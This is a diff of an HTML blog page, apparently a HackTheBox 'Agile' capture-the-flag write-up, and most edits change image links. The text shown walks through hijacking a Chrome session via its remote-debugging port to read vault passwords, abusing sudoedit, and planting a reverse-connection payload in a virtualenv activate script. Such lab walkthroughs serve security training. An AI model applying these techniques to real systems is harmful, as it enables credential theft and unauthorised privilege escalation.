+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;venv&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; www-data@agile:/app/app$
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;h2 id=&#34;lateral-movement&#34;&gt;Lateral Movement&lt;/h2&gt;
@@ -708,14 +768,18 @@ Private Bits:&lt;/li&gt;
 &lt;/div&gt;&lt;p&gt;We have finally reached the &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
 &lt;h3 id=&#34;hijacking-a-google-chrome-session-through-remote-debugging-port&#34;&gt;Hijacking a google chrome session through remote-debugging port&lt;/h3&gt;
 &lt;p&gt;Manual enumeration did not yield anything interesting to me. However, executing &lt;code&gt;linpeas&lt;/code&gt; showed me a potential route to privilege escalation i was unaware of.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://yuwenmichael.netlify.app/RunnerDebugPort.png&#34;
-	
-	
-	
+&lt;p&gt;&lt;img src=&#34;https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/RunnerDebugPort.png&#34;
+	width=&#34;1312&#34;
+	height=&#34;153&#34;
+	srcset=&#34;https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/RunnerDebugPort_hu8d0e819b355fb1d863e2570ebfb92ab5_112718_480x0_resize_box_3.png 480w, https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/RunnerDebugPort_hu8d0e819b355fb1d863e2570ebfb92ab5_112718_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Chrome session with remote debugging port&#34;
 	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;857&#34;
+		data-flex-basis=&#34;2058px&#34;
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;There is a process of google chrome running, and special attention is drawn to the fact that the &lt;code&gt;--remote-debugging-port&lt;/code&gt; flag is set. It appears that we might be able to hijack this web session, and explore the capabilities of what &lt;code&gt;runner&lt;/code&gt; can access in this webpage. First, we need a way for our local browser to reach the box&amp;rsquo;s port 41829. This is not directly accessible from our machine, so we must apply port forwarding. Chisel is a popular option, but since ssh exists I just utilize this approach&lt;/p&gt;
@@ -728,58 +792,78 @@ Private Bits:&lt;/li&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;To enter the port forwarding page in Google Chrome, in the url segment we type &lt;code&gt;chrome://inspect/#devices&lt;/code&gt;. Next, we must configure our ports to the right of &amp;ldquo;Discover network targets&amp;rdquo;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://yuwenmichael.netlify.app/ChromeConfig1.png&#34;
-	
-	
-	
+&lt;p&gt;&lt;img src=&#34;https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/ChromeConfig1.png&#34;
+	width=&#34;935&#34;
+	height=&#34;375&#34;
+	srcset=&#34;https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/ChromeConfig1_hu9342b4eb6d41174d4a1e6604659161c7_52690_480x0_resize_box_3.png 480w, https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/ChromeConfig1_hu9342b4eb6d41174d4a1e6604659161c7_52690_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Port Forwarding Page&#34;
 	
 	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;249&#34;
+		data-flex-basis=&#34;598px&#34;
+	
 &gt;&lt;/p&gt;
 &lt;p&gt;Set the address as localhost:1080, matching the listening port listed in our ssh command. This traffic will be forwarded to Agile box&amp;rsquo;s port 41829.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://yuwenmichael.netlify.app/ChromeConfig2.png&#34;
-	
-	
-	
+&lt;p&gt;&lt;img src=&#34;https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/ChromeConfig2.png&#34;
+	width=&#34;301&#34;
+	height=&#34;338&#34;
+	srcset=&#34;https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/ChromeConfig2_hu08e987191379c2d1f1788e8fc8d49751_17566_480x0_resize_box_3.png 480w, https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/ChromeConfig2_hu08e987191379c2d1f1788e8fc8d49751_17566_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Setting the address&#34;
 	
 	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;89&#34;
+		data-flex-basis=&#34;213px&#34;
+	
 &gt;&lt;/p&gt;
 &lt;p&gt;Now we can see a remote target. Notice the address is at &lt;code&gt;http://test.superpass.htb&lt;/code&gt;. This seems to be a local-only version of the service, potentially with different password information than the live version we interacted with previously.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://yuwenmichael.netlify.app/RemoteTarget.png&#34;
-	
-	
-	
+&lt;p&gt;&lt;img src=&#34;https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/RemoteTarget.png&#34;
+	width=&#34;716&#34;
+	height=&#34;339&#34;
+	srcset=&#34;https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/RemoteTarget_hudaab9515eefba0e485e91f1bcd6cb1ef_46967_480x0_resize_box_3.png 480w, https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/RemoteTarget_hudaab9515eefba0e485e91f1bcd6cb1ef_46967_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Target is now visible and accessible&#34;
 	
 	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;211&#34;
+		data-flex-basis=&#34;506px&#34;
+	
 &gt;&lt;/p&gt;
 &lt;p&gt;Selecting &lt;code&gt;inspect&lt;/code&gt; will open a new DevTools tab, where we can interact with the chrome session.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://yuwenmichael.netlify.app/SuperpassTestSession.png&#34;
-	
-	
-	
+&lt;p&gt;&lt;img src=&#34;https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/SuperpassTestSession.png&#34;
+	width=&#34;1094&#34;
+	height=&#34;633&#34;
+	srcset=&#34;https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/SuperpassTestSession_huf9110bd3a5f74d4765688e0792764833_314688_480x0_resize_box_3.png 480w, https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/SuperpassTestSession_huf9110bd3a5f74d4765688e0792764833_314688_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Interactive Chrome Session in test.superpass.htb&#34;
 	
 	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;172&#34;
+		data-flex-basis=&#34;414px&#34;
+	
 &gt;&lt;/p&gt;
 &lt;p&gt;Selecting the Vault, we see new passwords, this time for &lt;code&gt;edwards&lt;/code&gt;. This was also a user account name on the machine.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://yuwenmichael.netlify.app/EdCred.png&#34;
-	
-	
-	
+&lt;p&gt;&lt;img src=&#34;https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/EdCred.png&#34;
+	width=&#34;1114&#34;
+	height=&#34;432&#34;
+	srcset=&#34;https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/EdCred_hu2c0b46aa59adbdfc78f3dfa3c6af2101_98147_480x0_resize_box_3.png 480w, https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/EdCred_hu2c0b46aa59adbdfc78f3dfa3c6af2101_98147_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Ed&amp;rsquo;s Creds&#34;
 	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;257&#34;
+		data-flex-basis=&#34;618px&#34;
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;Using the inspect tools to the side of our web session, we can easily grab the raw text to copy. For this kind of password it is much better, so that we do not mistype when copying by hand.&lt;/p&gt;
@@ -841,14 +925,18 @@ Private Bits:&lt;/li&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;edwards@agile:/home/corum$ sudo -u dev_admin sudoedit /app/app-testing/tests/functional/creds.txt
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuwenmichael.netlify.app/EdCred2.png&#34;
-	
-	
-	
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/EdCred2.png&#34;
+	width=&#34;597&#34;
+	height=&#34;93&#34;
+	srcset=&#34;https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/EdCred2_hueb15812d0958841002e0eb68c1cf2cc5_19053_480x0_resize_box_3.png 480w, https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/EdCred2_hueb15812d0958841002e0eb68c1cf2cc5_19053_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Ed&amp;rsquo;s Creds 2&#34;
 	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;641&#34;
+		data-flex-basis=&#34;1540px&#34;
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;We see in a nano editor some more credentials for edwards.&lt;/p&gt;
@@ -989,25 +1077,33 @@ Setting up our environment variable:&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;When we execute we are not editing &lt;code&gt;creds.txt&lt;/code&gt;. Instead, we see &lt;code&gt;/app/venv/bin/activate&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://yuwenmichael.netlify.app/ativate.png&#34;
-	
-	
-	
+&lt;p&gt;&lt;img src=&#34;https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/ativate.png&#34;
+	width=&#34;941&#34;
+	height=&#34;309&#34;
+	srcset=&#34;https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/ativate_hu911b984b658346a7cede6675a6cc70a1_71575_480x0_resize_box_3.png 480w, https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/ativate_hu911b984b658346a7cede6675a6cc70a1_71575_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;/app/venv/bin/activate in vim&#34;
 	
 	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;304&#34;
+		data-flex-basis=&#34;730px&#34;
+	
 &gt;&lt;/p&gt;
 &lt;p&gt;To ensure our payload runs at the start of this script, I insert the command before the commented lines:&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://yuwenmichael.netlify.app/Payload_added.png&#34;
-	
-	
-	
+&lt;p&gt;&lt;img src=&#34;https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/Payload_added.png&#34;
+	width=&#34;730&#34;
+	height=&#34;172&#34;
+	srcset=&#34;https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/Payload_added_hua0f82bf1573ddbd688a680e9ee0352bb_35819_480x0_resize_box_3.png 480w, https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/Payload_added_hua0f82bf1573ddbd688a680e9ee0352bb_35819_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Malicious Payload&#34;
 	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;424&#34;
+		data-flex-basis=&#34;1018px&#34;
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;Now after waiting a few seconds, the connection reaches my kali machine:&lt;/p&gt;
